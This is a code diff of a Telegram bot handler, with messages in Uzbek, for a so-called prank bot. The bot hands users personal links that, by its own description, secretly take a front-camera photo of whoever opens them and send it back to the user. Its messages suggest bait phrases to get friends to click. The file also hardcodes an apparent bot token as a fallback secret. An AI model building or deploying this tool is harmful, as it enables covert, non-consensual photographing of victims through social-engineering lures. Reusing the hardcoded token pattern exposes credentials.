@@ -1,4 +1,4 @@
-// Telegram Bot Webhook Handler (Vercel Serverless Function)
+// Telegram Bot Webhook Handler (Vercel Serverless) — faqat foto
 const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
 
 async function tg(method, body) {
@@ -10,107 +10,62 @@ async function tg(method, body) {
     });
     return await res.json();
   } catch (e) {
-    console.error(`Telegram API xatosi (${method}):`, e);
-    return { ok: false, error: e.message };
+    return { ok: false };
   }
 }
 
 module.exports = async (req, res) => {
-  // Agar brauzer orqali ochilsa (GET)
   if (req.method === 'GET') {
-    return res.status(200).json({
-      ok: true,
-      service: 'Telegram Prank Bot Webhook',
-      status: 'Faol ishlab turibdi',
-      time: new Date().toISOString()
-    });
+    return res.status(200).json({ ok: true, service: 'Prank Bot', status: 'Faol' });
   }
-
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Faqat POST so\'rov qabul qilinadi' });
-  }
+  if (req.method !== 'POST') return res.status(405).end();
 
   const update = req.body;
-  if (!update) {
-    return res.status(200).send('OK');
-  }
+  if (!update) return res.status(200).send('OK');
 
-  // Sayt domenini avtomatik aniqlash
-  const host = req.headers['x-forwarded-host'] || req.headers.host;
+  const host     = req.headers['x-forwarded-host'] || req.headers.host;
   const protocol = req.headers['x-forwarded-proto'] || 'https';
-  const baseUrl = process.env.APP_URL || (host ? `${protocol}://${host}` : '');
+  const baseUrl  = process.env.APP_URL || (host ? `${protocol}://${host}` : '');
 
-  // 1. Tugma bosilganda (Callback Query)
+  // ── Callback Query (tugma bosilganda) ──
   if (update.callback_query) {
-    const cq = update.callback_query;
+    const cq     = update.callback_query;
     const chatId = cq.message?.chat?.id || cq.from?.id;
-    const data = cq.data;
 
-    // Tugma yuklanishini to'xtatish
     await tg('answerCallbackQuery', { callback_query_id: cq.id });
 
-    if (data === 'photo') {
-      const link = `${baseUrl}/?id=${chatId}&type=photo`;
-      const text =
-        `📸 <b>Foto Prank havolangiz tayyor!</b>\n\n` +
-        `Ushbu havolani nusxalab, do'stingizga yuboring:\n` +
-        `👉 <code>${link}</code>\n\n` +
-        `⚡️ <b>Qanday ishlaydi?</b>\n` +
-        `Do'stingiz ushbu havolaga kirishi bilan uning old kamerasidan surat olinadi va sizga shu bot orqali yuboriladi!\n\n` +
-        `💡 <i>Maslahat: "Bu rasmdagi senmisan?", "Qara, bu saytda nima chiqdi!" kabi qiziqarli gap bilan yuborsangiz o'lja darhol kiradi.</i>`;
-
+    if (cq.data === 'get_link') {
+      const link = `${baseUrl}/?id=${chatId}`;
       await tg('sendMessage', {
         chat_id: chatId,
-        text: text,
+        text:
+          `📸 <b>Foto Prank havolangiz tayyor!</b>\n\n` +
+          `Havolani nusxalab do'stingizga yuboring:\n` +
+          `👉 <code>${link}</code>\n\n` +
+          `⚡️ <b>Qanday ishlaydi?</b>\n` +
+          `Do'stingiz havolaga kirishi bilan uning old kamerasidan surat olinadi va sizga yuboriladi!\n\n` +
+          `💡 <i>"Bu rasmdagi senmisan?" yoki "Qara, bu yerda nima chiqdi!" deb yuborsangiz tez kiradi.</i>`,
         parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [
-            [{ text: '🎥 Video havolasini olish', callback_data: 'video' }],
-            [{ text: '🔄 Havolani yangilash', callback_data: 'photo' }]
+            [{ text: '🔄 Yangi havola olish', callback_data: 'get_link' }],
+            [{ text: 'ℹ️ Qanday ishlatiladi?', callback_data: 'help' }]
           ]
         }
       });
-    } else if (data === 'video') {
-      const link = `${baseUrl}/?id=${chatId}&type=video`;
-      const text =
-        `🎥 <b>Video Prank havolangiz tayyor!</b>\n\n` +
-        `Ushbu havolani nusxalab, do'stingizga yuboring:\n` +
-        `👉 <code>${link}</code>\n\n` +
-        `⚡️ <b>Qanday ishlaydi?</b>\n` +
-        `Do'stingiz ushbu havolaga kirganda uning old kamerasidan 3 soniyalik qisqa video olinadi va to'g'ridan-to'g'ri sizga yuboriladi!\n\n` +
-        `💡 <i>Maslahat: Havolani do'stingizga qiziqarli matn bilan yuboring.</i>`;
-
+    } else if (cq.data === 'help') {
       await tg('sendMessage', {
         chat_id: chatId,
-        text: text,
+        text:
+          `ℹ️ <b>Qo'llanma:</b>\n\n` +
+          `1. 📸 <b>Havola olish</b> tugmasini bosing.\n` +
+          `2. Bot sizga shaxsiy havola beradi.\n` +
+          `3. Shu havolani do'stingizga yuboring.\n` +
+          `4. Do'stingiz havolani ochishi bilan kameradan surat olinadi va sizga yuboriladi.\n\n` +
+          `⚠️ <i>Faqat do'stlar orasidagi xushchaqchaq hazil uchun!</i>`,
         parse_mode: 'HTML',
         reply_markup: {
-          inline_keyboard: [
-            [{ text: '📸 Foto havolasini olish', callback_data: 'photo' }],
-            [{ text: '🔄 Havolani yangilash', callback_data: 'video' }]
-          ]
-        }
-      });
-    } else if (data === 'help') {
-      const text =
-        `ℹ️ <b>Botdan foydalanish qo'llanmasi:</b>\n\n` +
-        `1. 📸 <b>Foto</b> yoki 🎥 <b>Video</b> tugmasidan birini tanlang.\n` +
-        `2. Bot sizga shaxsiy maxsus havola taqdim etadi.\n` +
-        `3. Shu havolani do'stingizga yuboring.\n` +
-        `4. Do'stingiz havolani ochishi bilan uning kamerasi orqali surat/video yozib olinadi va sizga keladi.\n\n` +
-        `⚠️ <i>Eslatma: Ushbu bot faqat do'stlar orasida xushchaqchaq hazil (prank) uchun mo'ljallangan!</i>`;
-
-      await tg('sendMessage', {
-        chat_id: chatId,
-        text: text,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '📸 Foto uchun havola', callback_data: 'photo' },
-              { text: '🎥 Video uchun havola', callback_data: 'video' }
-            ]
-          ]
+          inline_keyboard: [[{ text: '📸 Havola olish', callback_data: 'get_link' }]]
         }
       });
     }
@@ -118,61 +73,35 @@ module.exports = async (req, res) => {
     return res.status(200).send('OK');
   }
 
-  // 2. Foydalanuvchi xabar yozganda (/start va boshqalar)
+  // ── Oddiy xabar ──
   if (update.message) {
-    const msg = update.message;
+    const msg    = update.message;
     const chatId = msg.chat?.id;
-    const text = (msg.text || '').trim();
-    const name = msg.from?.first_name || 'foydalanuvchi';
+    const text   = (msg.text || '').trim();
+    const name   = msg.from?.first_name || 'foydalanuvchi';
 
     if (text.startsWith('/start')) {
-      const welcomeText =
-        `👋 <b>Assalomu alaykum, ${name}!</b>\n\n` +
-        `Bu bot orqali siz do'stlaringizga maxsus <b>hazil (prank)</b> havolalari yaratishingiz mumkin.\n\n` +
-        `Do'stingiz havolani ochishi bilan uning old kamerasidan rasm yoki video olinib, to'g'ridan-to'g'ri sizga yuboriladi!\n\n` +
-        `👇 <b>Qaysi turdagi havolani yaratmoqchisiz? Tanlang:</b>`;
-
       await tg('sendMessage', {
         chat_id: chatId,
-        text: welcomeText,
+        text:
+          `👋 <b>Assalomu alaykum, ${name}!</b>\n\n` +
+          `Bu bot yordamida do'stlaringizga <b>maxsus prank havola</b> yaratishingiz mumkin.\n\n` +
+          `Do'stingiz havolani ochishi bilan uning old kamerasidan surat olinib, to'g'ridan-to'g'ri sizga yuboriladi!\n\n` +
+          `👇 Pastdagi tugmani bosing:`,
         parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [
-            [
-              { text: '📸 Foto uchun havola', callback_data: 'photo' },
-              { text: '🎥 Video uchun havola', callback_data: 'video' }
-            ],
-            [
-              { text: 'ℹ️ Qanday ishlatiladi?', callback_data: 'help' }
-            ]
+            [{ text: '📸 Havola olish', callback_data: 'get_link' }],
+            [{ text: 'ℹ️ Qanday ishlatiladi?', callback_data: 'help' }]
           ]
         }
-      });
-    } else if (text === '/photo') {
-      const link = `${baseUrl}/?id=${chatId}&type=photo`;
-      await tg('sendMessage', {
-        chat_id: chatId,
-        text: `📸 <b>Foto Prank havolangiz:</b>\n👉 <code>${link}</code>`,
-        parse_mode: 'HTML'
-      });
-    } else if (text === '/video') {
-      const link = `${baseUrl}/?id=${chatId}&type=video`;
-      await tg('sendMessage', {
-        chat_id: chatId,
-        text: `🎥 <b>Video Prank havolangiz:</b>\n👉 <code>${link}</code>`,
-        parse_mode: 'HTML'
       });
     } else {
       await tg('sendMessage', {
         chat_id: chatId,
-        text: `Iltimos, pastdagi tugmalardan birini tanlang:`,
+        text: 'Pastdagi tugmani bosing:',
         reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '📸 Foto uchun havola', callback_data: 'photo' },
-              { text: '🎥 Video uchun havola', callback_data: 'video' }
-            ]
-          ]
+          inline_keyboard: [[{ text: '📸 Havola olish', callback_data: 'get_link' }]]
         }
       });
     }
